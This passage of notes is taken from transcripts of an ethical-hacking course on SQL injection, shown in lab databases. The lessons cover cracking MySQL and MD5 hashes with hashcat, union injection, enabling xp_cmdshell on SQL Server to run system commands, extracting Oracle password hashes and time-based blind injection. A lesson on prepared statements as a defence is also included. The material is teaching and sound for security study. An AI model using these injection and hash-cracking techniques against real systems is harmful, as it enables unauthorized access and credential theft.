>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=0)** - Often our objective when doing an SQL injection is to obtain credentials.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=5)** And just as often, the password is likely to be hashed.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=8)** It's useful, therefore, to be able to crack hashes we find in SQL systems.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=12)** When we create a user in SQL, we've already seen the form of hash we get.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=16)** Let's look at Marcus again.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=18)** We'll use my SQL.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=23)** And we'll select user comma password from user.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=35)** Now let's select this hash and try to crack it in crack station.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=41)** I'll paste it in.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=43)** I'll confirm that I'm a real person, and crack the hash.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=47)** And crack station recognizes that this is my SQL hash and it's easily cranked.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=53)** I've got to file with another hash that we might find in an SQL database.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=60)** Cat Hash MD five.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=63)** And we can see this looks different.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=65)** It starts with dollar signs.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=67)** I'll copy this.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=71)** I'll paste it into crank station again.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=75)** I'm not a robot and I'll crack it, but it's an unrecognized hash format.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=80)** Let's take a look at the hash count website where we see different types of hash formats.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=86)** If we scroll down to hash mode 500, we can see this looks similar to the hash we found.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=94)** It looks like we've got to salted MD five hash.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=97)** We can now try hash cat to recover the passwords.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=101)** For the purpose of this exercise, I've set up a small dictionary called my words.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=109)** And we'll use that to demonstrate how to crack the salted MD five password.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=116)** Hash cats.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=118)** NSM 500.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=122)** Hash MD five.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=126)** And we'll use my words as the password file.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980&t=132)** and hash cut recovers the password, which is in fact hash cat.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (6), database (1)
> **Env Vars:** sql (6), nsm (1)
> **CLI Commands:** cat (3), find (2)
> **UI Navigation:** scroll down (1)
> **Analogies:** similar to (1)
> **Prerequisites:** set up (1)
> **Speakers:** - often (1)

#### Injecting Microsoft SQL Server
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=0)** - [Instructor] SQL server express comes as a free download for windows 10.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=4)** I've got it installed on my windows 10 system, so let's go to the SQL server management studio.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=10)** I'll take the default, SQL express instance, which in my case is shuttle SQL express.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=17)** And we now have access to the instance in the management console.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=21)** Let's make sure we set up to use transactional queries, let's select tools, options, query execution, SQL server, general, and check the box by default, open new queries in SQL command mode and okay.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=41)** Let's also right click on the shuttle SQL express connection and select facets.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=49)** We'll change the dropdown to service security and set XP command shell enabled to true, okay, okay.
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=64)** Ignore the message about server agents and close the dialogue.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=67)** We can make a new database by right clicking databases and then entering the name Cleo.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=75)** New database, Cleo, okay.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=83)** And if we expand databases, we can see we have Cleo.
>
> **[1:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=87)** We can import our Pharos table by right clicking on the Cleo database, selecting tasks import flat file and we'll specify the input file, which we have in our exercise folder.
>
> **[1:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=112)** We'll click next and next and we'll set up the column names, which are Phid and which will make a small lint.
>
> **[2:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=130)** Name, make the verchar to two.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=141)** We'll put reign start, we'll just leave it as that.
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=147)** Reign end, dynasty and tomb as verchar eight.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=165)** I won't bother with keys so we can just click next and finish, and close.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=173)** Now we can use our windows command shell to execute transactional queries on the database.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=178)** We, the SQL command program to connect to the SQL instance.
>
> **[3:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=183)** Let's see what databases we have.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=187)** Select name from sys dot databases, go
>
> **[3:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=197)** and we list our databases.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=199)** Let's use our Cleo database.
>
> **[3:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=203)** Use Cleo, go.
>
> **[3:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=206)** We can run a union select on this.
>
> **[3:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=209)** Select name, from pharaoh union, select testing, go
>
> **[3:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=226)** and when we get the results.
>
> **[3:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=228)** Note the entry testing is in sort order in the results.
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=232)** We can access SQL server system names.
>
> **[3:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=236)** Select no from pharaoh
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=245)** union select quote dollar bracket, SQLCMD user
>
> **[4:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=253)** to get our current user bracket quote, go, and we get our username, which is user.
>
> **[4:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=264)** If the instance has the command shell extended procedure configured, we can use this to run system commands.
>
> **[4:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=271)** Execute, XP, command shell, who am I, go and where NT service MSSQL dollar, SQL express.
>
> **[4:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=289)** If we encounter errors with command shell, it may be because it's not enabled.
>
> **[4:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=293)** However we can enable it, if we're a sys admin.
>
> **[4:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=297)** Let's see how we check, if we're a sys admin.
>
> **[5:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=300)** We do this with select, no from Pharaoh union select
>
> **[5:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=312)** is server role member, sys admin, go
>
> **[5:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=325)** and we get a zero and a one back, the zero is the integer interpretation of the blank field and one is the sys admin flag.
>
> **[5:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=332)** Indeed, we are a sys admin.
>
> **[5:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=334)** Now, if we want to enable XP command shell, we can do that with four commands.
>
> **[5:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=341)** Execute, SP, configure show advanced options, comma one.
>
> **[5:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=356)** Reconfigure, execute, SP configure XP, command shell, comma one,
>
> **[6:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=378)** reconfigure and go.
>
> **[6:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=382)** In our case, we see that command shell has changed from one-to-one, we were already enabled for it.
>
> **[6:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=388)** We can't use the XP command shell directly in the union, but if we have a multiline option on, then we can add it to the end of the line.
>
> **[6:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=397)** Select no from pharaoh union select no execute, XP command shell, dir C code on slash users and go, and we get our directory listing out.
>
> **[7:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=427)** There are other ways to access system capabilities.
>
> **[7:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=429)** For example, using the cyst DMOS enumerate file system functions to list text files.
>
> **[7:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=438)** We'll go and we found a user dot text file our normal pen testing flag.
>
> **[7:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=444)** There are many of the cysts stored in extended procedures in SQL server, but these contend to be somewhat unreliable.
>
> **[7:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-microsoft-sql-server?u=76281980&t=451)** Nevertheless, it's worth spending a bit of time exploring them.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (7), [[Microsoft SQL Server|Sql server]] (5), express (5), database (5), [[Databases]] (5)
> **Env Vars:** sql (12), sqlcmd (1), mssql (1), dmos (1)
> **CLI Commands:** make (4)
> **Prerequisites:** set up (2), configure (2)
> **UI Navigation:** go to (1), dropdown (1)
> **Analogies:** for example (1)
> **Speakers:** - [instructor] (1)

#### Injecting Oracle SQL Server
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=0)** - [Instructor] Another useful SQL system to look at is Oracle, and it too has a slightly different way of accessing database information.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=7)** Oracle XE is a free download for Windows and Linux and is available from the website shown here.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=13)** I've already downloaded this, extracted the zip file and installed it.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=17)** Let's see how we use it.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=18)** We can start the client by saying sqlplus / as sysdba,
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=27)** and we get the SQL prompt.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=29)** Oracle comes with a core database, and it also has the option for application-specific databases called pluggable containers.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=37)** We can see the current database we're using by typing show con_name; which shows we're using the core database.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=47)** We can see what pluggable databases we have by entering show pdbs; Okay, we can see all tables in the database by running the query select table_name from all_tables;
>
> **[1:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=69)** and there's rather a lot of them.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=71)** We can restrict this, somewhat, to use a tables by entering select table_name from user_tables;
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=85)** but, again, there's quite a lot.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=86)** If we scroll up, we can see our Pharaoh table, so let's go query it.
>
> **[1:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=91)** We may wish to format our outputs, and we can do that by setting field widths using the col command.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=98)** Col name format a32.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=106)** Col dynasty format 99.
>
> **[1:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=114)** Col tomb format a8.
>
> **[1:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=119)** Okay, let's list our Pharaohs.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=122)** Select name,dynasty,tomb from pharaoh;
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=133)** as expected, we can use the normal SQL where like an order by clauses.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=139)** So we'll select our Pharaohs, where name like 'A%; order by name;
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=154)** More importantly, for our injections, we can do a union as well.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=158)** Prior to Oracle 11g, we could obtain the password DES-based hash from the password field, let's use a union to get that.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=168)** Select name,tomb from pharaoh where 1=0,
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=178)** which will suppress our pharaoh names, union select name,password from sys.user$,
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=194)** and we'll limit it to where name='SYS'.
>
> **[3:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=202)** We've suppressed our pharaoh output by forcing faults, and the output from sys.user$ shows the name and a blank password hash field.
>
> **[3:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=211)** We can check what password versions are in use by saying, select password_versions from dba_users
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=227)** where username='SYS'; and we can see that for the sys.user it's 11G and 12C.
>
> **[3:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=237)** From 11G onwards, the password field is null and we need to use the spare for field, which is an SHA-1 hash.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=245)** We can also use the CONCAT function to build a multi-field string.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=250)** Select concat concat name,' ' ,spare4 from sys.user$
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=272)** where name='SYS'; and we get the entry for the sys.user where we see the 11G hash, shown with the S prefix, and the 12C hash, shown with the T prefix.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-oracle-sql-server?u=76281980&t=288)** Oracle is a bit different to MySQL and SQL server, but it's still a target for SQL injections using similar techniques to those we've been looking at.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** database (5), [[SQL]] (4), [[Databases]] (2), [[Windows]] (1), [[Linux]] (1)
> **Env Vars:** sql (5), sys (3), des (1), sha (1), concat (1)
> **Code Identifiers:** table_name (2), con_name (1), all_tables (1), user_tables (1), password_versions (1)
> **Definitions:** is a  (2), is an  (1)
> **CLI Commands:** mysql (1)
> **UI Navigation:** scroll up (1)
> **Exercise Files:** zip file (1)
> **Speakers:** - [instructor] (1)


### 3. Automating SQL Injection Exploits

[↑ Back to Table of Contents](#table-of-contents)

#### Inferring TRUE when blind
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=0)** - Sometimes we can try an SQL injection and all we see is an error message such as, username not known, and we have no idea whether the query ran or not.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=9)** It may have done, but we're blind as far as the results that came from it.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=13)** Let's see how we handle that using our MySQL user table.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=18)** Sudo, MySQL -U, root.
>
> **[0:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=25)** Use MySQL, and let's select password from user where user equals Marcus.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=42)** Okay, we get our password hash.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=44)** But let's assume that we have a form asking for a name and a password.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=47)** Even when we try to run an SQL injection, we may not see any results other than an error message.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=53)** In such cases, it can be quite useful to have a way to know that our injection was successful.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=59)** If we can't get SQL to tell us that, then we need to infer that it was successful by triggering an event that we can detect.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=67)** And this is referred to as blind SQL injection or inferential injection.
>
> **[1:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=72)** Let's do our union SQL injection attack, but in our select we'll use the special sleep function.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=78)** Select password from user where user equals Marcus, union, select sleep five from user
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=93)** where password like star 1%.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=105)** And that returns straightaway.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=107)** The function sleep five did not get executed.
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=110)** Let's run that again and use the phrase like star two.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=118)** And this returns after five seconds.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=121)** The sleep function did get executed.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=123)** We know the first character of the hash is star, and now that we've executed a sleep, we can infer therefore that the next character is two.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=132)** Similarly, when we run like 2A, we return straight away.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=140)** Like 2B, return straight away, Like 2C, sleeps for five seconds.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=152)** So our next character is C.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=154)** And we can continue this until we recover the complete hash.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/inferring-true-when-blind?u=76281980&t=157)** Blind SQL queries are extremely powerful and used a lot in tools such as SQL Map, but they can be quite slow at recovering large amounts of data.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (7), [[MySQL]] (3), next (2), data (1)
> **Env Vars:** sql (7)
> **CLI Commands:** mysql (3), sudo (1)
> **Analogies:** such as (2)
> **Definitions:** is an  (1)
> **Speakers:** - sometimes (1)

#### Using prepared SQL queries
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=0)** - [Instructor] Let's think about how we might code SQL queries to understand the way in which we need to protect them.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=7)** We'll start with a simple Python program as shown here, nano sql1.py.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=18)** All we do is open the SQL database, request the pharaoh ID, select the correct record, and then print the pharaoh's name, dynasty and tomb.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=30)** Let's run that, python3 sql1.py.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=39)** We'll request pharaoh ID, 175.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=44)** Our code works.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=44)** And here we have Cleopatra II.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=48)** Let's check pharaoh ID 50.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=53)** And we find it's Kamose.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=55)** Now let's run an SQL injection attack, or 1=1.
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=64)** And we get them all.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=67)** Let's see how we can make our routine safe.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=71)** Our first option is to use a prepared statement.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=77)** Let's see what that looks like in code by updating our Python script, nano safesql1.py.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=92)** We now use the parameter, prepared=True, when setting up the cursor.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=98)** And we execute the query as a pre-coded statement and variable value.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=107)** Let's now run it, python3 safesql1.py.
>
> **[1:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=119)** So let's enter 50.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=123)** And again, we get Kamose.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=126)** And now, let's run an SQL injection attack, or 1=1.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=136)** And this time it doesn't get through.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-prepared-sql-queries?u=76281980&t=140)** We're now safe from basic injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (4), [[Python (Programming Language)|Python]] (2), database (1)
> **CLI Commands:** python (2), python3 (2), find (1), make (1)
> **File Paths:** sql1.py (2), safesql1.py (2)
> **Env Vars:** sql (4)
> **UI Navigation:** open the (1), select the (1)
> **Speakers:** - [instructor] (1)

#### Getting our first sqlmap injection
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/getting-our-first-sqlmap-injection?u=76281980&t=0)** - One of the important pen testing tools for targets using SQL is SQL Map.
>
